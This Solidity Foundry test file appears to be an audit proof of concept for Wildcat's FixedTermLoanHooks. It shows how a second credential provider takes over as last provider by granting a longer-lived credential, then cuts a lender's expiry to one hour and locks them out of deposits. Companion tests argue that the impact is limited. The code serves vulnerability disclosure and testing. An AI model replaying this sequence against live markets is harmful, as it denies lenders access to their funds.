// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';
import { FixedTermLoanHooks } from 'src/access/FixedTermLoanHooks.sol';

/// Real market (deployed through HooksFactory) whose hooks instance is FixedTermLoanHooks.
contract Poc57 is BaseMarketTest {
  FixedTermLoanHooks internal ftHooks;
  address internal providerA;
  address internal providerB;
  address internal victim = address(0xC0FFEE);

  function _getHooksTemplate() internal virtual override returns (address) {
    return LibStoredInitCode.deployInitCode(type(FixedTermLoanHooks).creationCode);
  }

  function setUp() public virtual override {
    startPrank(address(this));
    archController.registerBorrower(borrower);
    stopPrank();
    updateFeeConfiguration(parameters);

    startPrank(borrower);
    ftHooks = FixedTermLoanHooks(hooksFactory.deployHooksInstance(hooksTemplate, ''));
    stopPrank();

    parameters.asset = address(asset = new MockERC20('Token', 'TKN', 18));
    HooksConfig cfg = EmptyHooksConfig
      .setHooksAddress(address(ftHooks))
      .setFlag(Bit_Enabled_Deposit)
      .setFlag(Bit_Enabled_QueueWithdrawal)
      .setFlag(Bit_Enabled_SetAnnualInterestAndReserveRatioBips);
    startPrank(borrower);
    market = WildcatMarket(
      hooksFactory.deployMarket(
        DeployMarketInputs({
          asset: parameters.asset,
          namePrefix: 'Wildcat ',
          symbolPrefix: 'WC',
          maxTotalSupply: parameters.maxTotalSupply,
          annualInterestBips: 1000,
          delinquencyFeeBips: 1000,
          withdrawalBatchDuration: 1 days,
          reserveRatioBips: 2000,
          delinquencyGracePeriod: 2000,
          hooks: cfg
        }),
        abi.encode(block.timestamp + 30 days),
        bytes32(uint256(uint160(borrower)) << 96),
        address(0),
        0
      )
    );
    providerA = address(new MockRoleProvider());
    providerB = address(new MockRoleProvider());
    // Provider A: 365-day credentials. Provider B: 366-day credentials.
    ftHooks.addRoleProvider(providerA, 365 days);
    ftHooks.addRoleProvider(providerB, 366 days);
    stopPrank();

    asset.mint(victim, 10e18);
    startPrank(victim);
    asset.approve(address(market), type(uint256).max);
    stopPrank();
  }

  function _credentialExpiry(address account, uint32 ts, uint32 ttl) internal pure returns (uint256) {
    return uint256(ts) + ttl;
  }

  function test_poc57_providerShortensAnotherProvidersCredential() external {
    uint32 t0 = uint32(block.timestamp);

    // Provider A grants the victim a credential valid for 365 days.
    startPrank(providerA);
    ftHooks.grantRole(victim, t0);
    stopPrank();
    assertEq(ftHooks.getLenderStatus(victim).lastProvider, providerA);
    assertEq(ftHooks.getLenderStatus(victim).lastApprovalTimestamp, t0);
    uint256 expiryBefore = t0 + 365 days;

    // Control: victim can deposit under A's credential.
    uint256 snap = vm.snapshot();
    startPrank(victim);
    market.deposit(1e18);
    stopPrank();
    assertEq(market.balanceOf(victim), 1e18, 'control: deposit succeeds with A credential');
    vm.revertTo(snap);

    // Direct attempt by B to cut A's credential to ~1 hour from now is rejected,
    // as documented in grantRole's natspec.
    uint32 shortTs = uint32(block.timestamp + 1 hours - 366 days);
    startPrank(providerB);
    vm.expectRevert(FixedTermLoanHooks.ProviderCanNotReplaceCredential.selector);
    ftHooks.grantRole(victim, shortTs);

    // Step 1: B grants with a later expiry (t0 + 366 days > t0 + 365 days). Accepted,
    // and B becomes lastProvider.
    ftHooks.grantRole(victim, t0);
    assertEq(ftHooks.getLenderStatus(victim).lastProvider, providerB, 'B took over');
    // Step 2: B is now the previous provider, so it may lower the expiry to ~1 hour.
    ftHooks.grantRole(victim, shortTs);
    stopPrank();

    LenderStatus memory status = ftHooks.getLenderStatus(victim);
    uint256 expiryAfter = uint256(status.lastApprovalTimestamp) + 366 days;
    assertEq(status.lastProvider, providerB);
    assertEq(expiryAfter, block.timestamp + 1 hours, 'expiry cut to one hour');
    assertLt(expiryAfter, expiryBefore, 'expiry is lower than the one A set');
    emit log_named_uint('expiry set by A (seconds from now)', expiryBefore - block.timestamp);
    emit log_named_uint('expiry after B (seconds from now)  ', expiryAfter - block.timestamp);

    // Credential still valid for the hour, then lapses.
    fastForward(1 hours + 1);
    assertGt(block.timestamp, expiryAfter);
    assertLt(block.timestamp, expiryBefore, 'A credential would still be valid');

    // Concrete blocked action: the victim cannot deposit into the market.
    startPrank(victim);
    vm.expectRevert(FixedTermLoanHooks.NotApprovedLender.selector);
    market.deposit(1e18);
    stopPrank();

    // Recoverability: borrower (a provider with no expiry) restores access in one call.
    startPrank(borrower);
    ftHooks.grantRole(victim, uint32(block.timestamp));
    stopPrank();
    startPrank(victim);
    market.deposit(1e18);
    stopPrank();
    assertEq(market.balanceOf(victim), 1e18, 'victim deposits after borrower re-grants');
  }

  /// Provider B (once lastProvider) can also remove the victim outright with revokeRole;
  /// shows the shortening gives no capability beyond what a lastProvider already has.
  function test_poc57_lastProviderCanAlsoRevokeOutright() external {
    uint32 t0 = uint32(block.timestamp);
    startPrank(providerA);
    ftHooks.grantRole(victim, t0);
    stopPrank();
    startPrank(providerB);
    vm.expectRevert(FixedTermLoanHooks.ProviderCanNotRevokeCredential.selector);
    ftHooks.revokeRole(victim);
    ftHooks.grantRole(victim, t0);
    ftHooks.revokeRole(victim);
    stopPrank();
    assertFalse(ftHooks.getLenderStatus(victim).hasCredential());
  }

  /// Borrower alone can already lock any lender out of deposits, with no provider involved.
  function test_poc57_borrowerAlreadyHasThisPower() external {
    startPrank(providerA);
    ftHooks.grantRole(victim, uint32(block.timestamp));
    stopPrank();
    startPrank(borrower);
    ftHooks.blockFromDeposits(victim);
    stopPrank();
    startPrank(victim);
    vm.expectRevert(FixedTermLoanHooks.NotApprovedLender.selector);
    market.deposit(1e18);
    stopPrank();
  }
}
